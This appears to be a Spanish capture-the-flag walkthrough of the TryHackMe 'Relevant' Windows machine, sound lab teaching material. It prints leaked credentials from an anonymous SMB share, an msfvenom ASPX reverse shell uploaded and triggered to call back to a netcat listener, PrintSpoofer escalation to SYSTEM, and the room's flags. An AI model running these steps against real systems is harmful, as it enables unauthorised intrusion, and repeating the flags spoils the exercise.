# Writeup Relevant - TryHackMe

| **Información** | **Detalle** |
| :--- | :--- |
| **IP** | `10.114.170.190` |
| **Plataforma** | TryHackMe |
| **Sistema Operativo** | Windows |
| **Dificultad** | Media |

---

## Tabla de Contenidos

1. [Reconocimiento](#reconocimiento)
2. [Enumeración SMB](#enumeración-smb)
3. [Acceso Inicial (Web Shell ASPX)](#acceso-inicial-web-shell-aspx)
4. [Escalada de Privilegios (PrintSpoofer)](#escalada-de-privilegios-printspoofer)
5. [Flags](#flags)

---

## Reconocimiento

Lo primero que vamos a hacer, como siempre, es realizar un escaneo de puertos para saber con lo que tenemos para empezar a tener acceso y saber puntos de entrada.

```bash
sudo nmap -sC -sV -sS 10.114.170.190 -oN scan_relevant.txt

```

```bash
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds (workgroup: WORKGROUP)
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2026-03-23T09:56:06
|_Not valid after:  2026-09-22T09:56:06
|_ssl-date: 2026-03-24T10:38:38+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2026-03-24T10:37:58+00:00
Service Info: Host: RELEVANT; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-03-24T10:37:59
|_  start_date: 2026-03-24T09:56:06
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-03-24T03:38:02-07:00
|_clock-skew: mean: 1h24m00s, deviation: 3h07m51s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

```

---

## Resultados
Podemos ver que tiene bastantes puertos abiertos, 80 (http), 135, 139, 445, que es SMB y promete bastante debido a que permite autenticarse de forma anónima con permisos de escritura, lo que es un error grave de configuración de SMB.

```bash
smbclient -L //10.114.170.190/

```

```bash
Password for [WORKGROUP\kali]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	nt4wrksv        Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.114.170.190 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

```
Al ver los recursos disponibles, llama bastante la atención uno llamado "nt4wrksv", que tiene permisos de escritura.

```bash
smbclient -N //10.114.170.190/nt4wrksv

```
Al acceder al recurso SMB, descubrimos un archivo curioso, llamado "passwords.txt", y como tenemos permisos, podemos descargarlo sin problema y ver tranquilamente su contenido

```bash
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Jul 25 23:46:04 2020
  ..                                  D        0  Sat Jul 25 23:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 17:15:33 2020

		7735807 blocks of size 4096. 5101272 blocks available
smb: \> get passwords.txt

```

---
Vaya, vaya, vaya, he descifrado el texto codificado y tenemos las contraseñas de acceso a la máquina, quien fue el genio que dejó eso ahí y por qué no lo ha cambiado. Puede ser útil en el futuro, así que lo dejamos de momento como hallazgo.

```bash
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
Bob - !P@$$W0rD!123
Bill - Juw4nnaM4n420696969!$$$
```
## Acceso Inicial (Inyección de Web Shell ASPX)
Al tener un error de conf muy gordo, podemos acceder a la máquina como USUARIO, de momento. Para ello, utilizaremos una herramienta muy interesante de Metasploit llamada "msfvenom", que nos permite realizar un payload para ganar acceso inicial a la máquina.

1. Generamos el payload con msfvenom:
   ```bash
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.168.157 LPORT=443 -f aspx -o shell.aspx
   ```
2. Subimos el payload al recurso SMB:
   ```bash
  smbclient //10.114.170.190/nt4wrksv -c 'put shell.aspx'
   Password for [WORKGROUP\kali]:
    putting file shell.aspx as \shell.aspx (23.5 kB/s) (average 23.5 kB/s)
   ```
3. Creamos un NetCat para que escuche en el puerto 443 sobre el payload recién creado.
 ```bash
nc -lvnp 443
```

4. Ahora hacemos un curl para que se ejecute el payload:
   ```bash
   curl http://10.114.170.199:49663/nt4wrksv/shell.aspx
   ```
   *El terminal del servidor parece colgarse temporalmente. Segundos después, la ansiada consola del usuario de bajo privilegio (`iis apppool\defaultapppool`) parpadea en la pestaña de nuestro Netcat.*

![Reverse Shell](/imgRelevant/image.png)

*Tenemos acceso a la máquina. Buen punto de partida para escalar.*

---

## Escalada de Privilegios

Ahora que tenemos acceso a la máquina como usuario, vamos a buscar una forma de escalar privilegios para obtener acceso como administrador. Primero miramos qué privilegios tiene nuestro usuario actual:

```cmd
whoami /priv
```

Podemos ver que tenemos el privilegio `SeImpersonatePrivilege` habilitado. Básicamente esto significa que podemos "hacernos pasar" por otro usuario del sistema, incluido el todopoderoso `NT AUTHORITY\SYSTEM`. Para aprovecharnos de eso usaremos [PrintSpoofer](https://github.com/itm4n/PrintSpoofer), una herramienta que abusa del servicio de impresión de Windows para forzar a SYSTEM a conectarse a un canal que nosotros controlamos, y en ese momento le robamos el token de autenticación.

1. Nos descargamos el binario `PrintSpoofer64.exe` desde el repositorio y lo subimos al share SMB (el mismo que hemos usado antes):
   ```bash
   smbclient //10.114.188.110/nt4wrksv -c 'put PrintSpoofer64.exe'
   ```
2. Desde la reverse shell que ya tenemos, navegamos a la carpeta donde está el share y ejecutamos PrintSpoofer pidiéndole que nos abra una CMD interactiva como SYSTEM:
   ```bash
   cd C:\inetpub\wwwroot\nt4wrksv
   PrintSpoofer64.exe -i -c cmd
   ```
3. Si todo va bien, nos aparece una nueva CMD y al hacer `whoami` vemos que somos `NT AUTHORITY\SYSTEM`. Objetivo cumplido.

![PrintSpoofer](/imgRelevant/image2.png)

---

## Flags

### Flag de Usuario (user.txt)

```cmd
c:\Users\Bob\Desktop>type user.txt
type user.txt
THM{fdk4ka34vk346ksxfr21tg789ktf45}
```



### Flag de Root (root.txt)

```cmd
C:\Users\Administrator\Desktop>type root.txt
type root.txt
THM{1fk5kf469devly1gl320zafgl345pv}

```